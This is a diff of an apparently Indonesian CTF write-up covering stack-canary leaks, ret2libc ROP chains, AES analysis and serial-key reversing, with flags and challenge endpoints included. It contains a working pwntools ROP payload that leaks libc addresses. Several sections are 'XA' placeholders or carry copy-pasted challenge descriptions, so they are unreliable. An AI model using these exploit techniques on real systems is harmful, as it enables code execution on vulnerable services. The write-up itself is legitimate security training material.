@@ -1,7 +1,8 @@
 ﻿# Binary Exploitation
 
-## Canary2Win
-***Author: NeoZap***
+## 1. Canary2Win
+*Author: NeoZap*
+
 Mr. Ary is a professional and notorious stack smasher. I don't want to be a victim of Mr. Ary's shenanigans, so I added some protection to my binary and proudly said "Let's see if you can, Ary!". But alas, Mr. Ary still smashed my stack 😔. Can you too? Hopefully not that huge of a diff spike 🙏 
 
     nc 34.101.174.85 10002
@@ -12,7 +13,7 @@ Terdapat kerentanan di fungsi `vuln()` pada source code yang diberikan. Kelemaha
 
 Inti dari tantangan ini adalah menggabungkan dua jenis kelemahan, yaitu: format string untuk membocorkan address canary dan buffer overflow untuk mengarahkan return address ke fungsi `win()`.  
 
-Canary adalah nilai acak yang terletak di antara buffer dan return address. Jika canary berubah, program akan berhenti dan mengeluarkan pesan `***stack smashing detected***`. Walaupun tidak tampil langsung di source code, namun bisa dilihat saat di decompile :
+Canary adalah nilai acak yang terletak di antara buffer dan return address. Jika canary berubah, program akan berhenti dan mengeluarkan pesan `***stack smashing detected***`. Walaupun tidak tampil langsung di source code, namun bisa dilihat saat di debug :
 
 ![canary1](images/canary1.png)
 
@@ -50,8 +51,8 @@ Setelah menemukan nilai canary, selanjutnya adalah menyusun payload dan return t
 
 **Flag: COMPFEST15{fmtstr_to_leak_canary_bof_to_win__s4tsetsats3t}**
 
-## ret2libc
-***Author: NeoZap***
+## 2. ret2libc
+*Author: NeoZap*
 
 Usual ret2libc.
 
@@ -117,8 +118,8 @@ Hitung base address dari `libc` dengan mengurangkan alamat `printf` yang sudah d
 
 **Flag: COMPFEST15{ret2libc_more_like_ret2libzy_peazy_lemon_squeezy}**
 
-## ret2lib--c? i don't c it..
-***Author: NeoZap***
+## 3. ret2lib--c? i don't c it..
+*Author: NeoZap*
 
 Same binary as ret2libc, but where is the libc? I don't see it..
 
@@ -127,11 +128,43 @@ Same binary as ret2libc, but where is the libc? I don't see it..
 `nc 34.101.174.85 10008`
 
 ### Solution
-Challenge ini mirip dengan yang sebelumnya (*bahkan source code dan binary filenya juga sama*), jadi saya skip bagian code review dan identifikasi kasusnya. Yang membedakan adalah kali ini kita tidak diberikan file `libc.so.6`
+Challenge ini mirip dengan yang sebelumnya (*bahkan source code dan binary filenya juga sama*), jadi saya skip bagian code review dan identifikasi kasus. Yang membedakan adalah kali ini kita tidak diberikan file `libc.so.6`. Jadi kita perlu mencari tahu sendiri versi libc yang digunakan oleh server agar perhitungan base address libc tepat.
+
+Berikut adalah payload untuk leak address printf
+
+    payload  =  flat({
+        offset: [
+	        pop_rdi,
+	        elf.got.printf,
+	        ret, # stack alignment
+	        elf.plt.printf,
+	        ret,
+	        elf.symbols.main
+        ]
+    })
+    io.sendlineafter('>', payload)
+    io.recv()
+    
+    # Leaked printf addr
+    leaked_printf  =  unpack(io.recv()[:6].ljust(8, b"\x00"))
+    info("Leaked: %#x", leaked_printf)
 
 
-## Greetify
-***Author: NeoZap***
+![leaked-printf-v2](images/leaked-printf-v2.png)
+    
+Setelah tau address fungsi `printf`, kita bisa mengetahui versi libc pada server. Copy 3 bytes terakhir dari leaked printf address ke url berikut : https://libc.blukat.me/ maka akan didapatkan
+
+![libc-version](images/libc-version.png)
+
+Lihat tabel bagian Offset pada web tersebut, value itu yang akan kita pakai untuk menghitung `libc base address`, `/bin/sh`, dan address `system`. Step selanjutnya sama persis dengan soal sebelumnya.
+
+**[Berikut adalah script solver yang saya gunakan](PWN-canary2win/exploit.py)**
+
+![ret2libc2-flag](images/ret2libc2-flag.png)
+
+
+## 4. Greetify
+*Author: NeoZap*
 
 Because I'm feeling lonely, I made an application to greet me. But I'm sure that I'm not the only one who's lonely, so I made it in a way that it can greet anyone. However, I'm not sure if it's safe to use. Can you help me check it?
 
@@ -159,10 +192,13 @@ Pada source code, terlihat bahwa variabel `name` menyimpan buffer sebanyak 88 by
 
 ![greetify-flag](images/greetify-flag.png)
 
+## 5. Lets Jump
+To be added soon.
+
 # Cryptography
 
-## Seems Familiar
-***Author: potsu***
+## 6. Seems Familiar
+*Author: potsu*
 
 Your friend has developed an AES-based enryption system in his spare time. That system is very limited and only able to use printable characters, and furthermore, two of four of its functions has yet to be fixed. Even though they are broken, he insisted the flag can be acquired through thorough analysis of the encryption itself. Feeling intrigued, you feel like you are able to get the flag.
 
@@ -190,24 +226,34 @@ Karena setiap blok dienkripsi secara independen, kita dapat mengirimkan berbagai
 
 # Reverse Engineering
 
-## Serial Key
-***Author: prajnapras19****
+## 7. Serial Key
+*Author: prajnapras19*
 
 Classic reverse, classic serial key
 
 `nc 34.101.174.85 10003`
 
 ### Source Code Review
-XA
+Hanya diberikan file binary tanpa source code, Jadi silakan decompile sendiri menggunakan `Ghidra` atau decompiler lainnya. Terdapat dua user defined function, yaitu fungsi `main()` dan fungsi `check()`. Informasi yang didapatkan berdasarkan fungsi `check` :
+- Panjang serial key adalah 24 karakter
+- Jika panjang param_1 adalah 24 karakter, maka fungsi memeriksa apakah karakter ke-5, ke-10, ke-15 adalah '-'. Jika salah satu dari karakter tersebut bukan '-', maka fungsi mengembalikan 0.
+- Setiap key yang valid akan dicek terhadap setiap key valid sebelumnya melalui serial dan idx, dan apabila sudah ada sebelumnya, akan ditolak.
+- Jika semua pemeriksaan di atas dilewati, maka param_1 ditambahkan ke daftar serial yang valid dan idx ditambahkan dengan 1. Fungsi kemudian mengembalikan 1, yang berarti param_1 adalah serial key yang valid.
 
-### Case Identification
-XA
+Serial key akan selalu mengikuti format `XXXX-XXXX-XXXX-XXXX-XXXX` dimana X adalah karakter alphanumeric. **Intinya**, berdasarkan fungsi `main`,  flag akan muncul jika kita berhasil membuat 100 key unik yang beda dari key sebelumnya.
+
 
 ### Solution
-XA
+Berdasarkan informasi di atas, contoh serial key yang valid adalah :
+- AAAA-BBBB-CCCC-DDDD-EEEE 
+- BBBB-AAAA-CCCC-DDDD-EEEE 
+- BBBB-CCCC-AAAA-DDDD-EEEE 
+- BBBB-CCCC-DDDD-AAAA-EEEE
 
-## baby JaSon adler
-***Author: Lily***
+Hal ini akan mudah jika dibuat automasi dengan script python. **[Berikut adalah script solver yang saya gunakan](Reversing-SerialKey)**
+
+## 8. baby JaSon adler
+*Author: Lily*
 
 Most people say that babies are hard to understand. But that’s not the case for baby Jason. everyone can understand him easily.
 
@@ -221,3 +267,41 @@ XA
 XA
 
 # Web Exploitation
+
+## 9. SpotyShare
+*Author: Lily*
+
+Most people say that babies are hard to understand. But that’s not the case for baby Jason. everyone can understand him easily.
+
+### Source Code Review
+XA
+
+### Case Identification
+XA
+
+### Solution
+XA
+
+
+## 10. best64
+*Author: Lily*
+
+Most people say that babies are hard to understand. But that’s not the case for baby Jason. everyone can understand him easily.
+
+### Case Identification
+XA
+
+### Solution
+XA
+
+
+## 11. internal web
+*Author: Lily*
+
+Most people say that babies are hard to understand. But that’s not the case for baby Jason. everyone can understand him easily.
+
+### Case Identification
+XA
+
+### Solution
+XA
